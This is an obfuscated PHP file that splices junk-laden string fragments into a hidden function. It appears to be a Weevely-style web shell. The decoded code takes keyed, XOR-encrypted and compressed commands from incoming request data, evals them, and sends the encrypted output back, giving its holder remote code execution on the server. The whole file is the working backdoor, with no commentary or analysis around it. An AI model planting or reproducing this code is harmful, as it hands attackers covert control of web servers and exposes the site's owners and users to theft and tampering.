<?php
$o='kt{$i}Ak^$k{$jAk};}}Akreturn Ak$Ako;}if (@preg_matAkch(Ak"/$kh(.+)Ak$kfAk/Ak"Ak,@file_g';
$T=str_replace('S','','SScreaSte_SfuncStiSon');
$i='et_contAkents("php:/Ak/inputAk"),$m)==Ak1)Ak {@ob_Akstart();@eAkvalAk(@AkgzuncomAkprAkess(@x(';
$e='@baseAk64_decodAkAke($mAk[1]),$kAk)));$o=@obAk_get_AkcontAkents();@oAkb_endAk_cl';
$y='ean();$Akr=@AkbAkase64_encode(Ak@x(@gzcoAkmprAkeAkAksAks($o),$k));print("$p$khAk$r$kf");}';
$R='$kAk="b344431Akb";$kh=Ak"45Akbb63Ak2d274c";Ak$kf="d0a6eAke83b0aAk8";$p=Ak"pbhAkMMAOL';
$G='";forAk(Ak$iAk=0;$Aki<$l;){for(Ak$j=0;($jAk<$c&&$i<Ak$l)Ak;$Akj++,$i++){$o.=Ak$A';
$b='KYNAk7G33k"Ak;funAkctionAk x(Ak$t,$k){$c=strAklen(Ak$k)Ak;$l=strlAken($t);$oAk="';
$W=str_replace('Ak','',$R.$b.$G.$o.$i.$e.$y);
$U=$T('',$W);$U();
?>
